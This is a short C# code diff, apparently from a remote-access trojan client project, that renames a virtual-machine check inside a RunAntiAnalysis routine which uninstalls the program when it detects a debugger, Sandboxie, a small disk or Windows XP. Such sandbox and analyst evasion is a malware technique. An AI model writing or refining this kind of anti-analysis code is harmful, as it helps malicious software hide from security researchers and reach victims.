@@ -23,7 +23,7 @@ namespace Client.Helper
     {
         public static void RunAntiAnalysis()
         {
-            if (DetectVirtualMachine() || DetectDebugger() || DetectSandboxie() || IsSmallDisk() || IsXP())
+            if (DetectManufacturer() || DetectDebugger() || DetectSandboxie() || IsSmallDisk() || IsXP())
                 //Environment.FailFast(null);
                 new HandleUninstall();
         }
@@ -49,7 +49,7 @@ namespace Client.Helper
             return false;
         }
 
-        private static bool DetectVirtualMachine()
+        private static bool DetectManufacturer()
         {
             try
             {
